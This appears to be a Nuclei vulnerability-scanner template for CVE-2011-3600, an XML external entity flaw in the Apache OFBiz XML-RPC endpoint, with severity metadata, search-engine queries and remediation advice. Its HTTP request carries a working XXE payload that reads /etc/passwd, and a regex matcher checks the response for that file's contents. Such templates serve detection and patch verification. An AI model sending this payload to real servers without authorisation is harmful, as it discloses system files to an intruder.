id: CVE-2011-3600

info:
  name: Apache OFBiz - XML External Entity Injection
  author: daffainfo,pikpikcu
  severity: high
  description: |
    The /webtools/control/xmlrpc endpoint in OFBiz XML-RPC event handler is exposed to External Entity Injection by passing DOCTYPE declarations with executable payloads that discloses the contents of files in the filesystem. In addition, it can also be used to probe for open network ports, and figure out from returned error messages whether a file exists or not. This affects OFBiz 16.11.01 to 16.11.04.
  impact: |
    Attackers can disclose sensitive filesystem data, probe network ports, and determine file existence, leading to information disclosure and potential further exploitation.
  remediation: |
    Update to the latest OFBiz version or apply security patches addressing XML external entity vulnerabilities.
  reference:
    - https://lists.apache.org/thread/cwz2v0b6pnxvqrnsd0hj3l80g9qq5kd8
    - https://nvd.nist.gov/vuln/detail/CVE-2011-3600
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2011-3600
    cwe-id: CWE-611
    epss-score: 0.37264
    epss-percentile: 0.97039
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: apache
    product: ofbiz
    shodan-query:
      - http.html:"ofbiz"
      - ofbiz.visitor=
    fofa-query:
      - body="ofbiz"
      - app="apache_ofbiz"
  tags: cve,cve2011,apache,ofbiz,xxe,vuln,vkev

http:
  - raw:
      - |
        POST /webtools/control/xmlrpc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file:////etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "faultString"
        condition: and

      - type: status
        status:
          - 200
# digest: 4b0a004830460221008d4c6826c5f78f61c822a67ddc0a9cafaed29cef4caeb7cfb2b513cefe7a8910022100edba88d131643d082d97561b29c85c943f9b951c23d079b0f9f6ef7e82a90c07:922c64590222798bb761d5b6d8e72950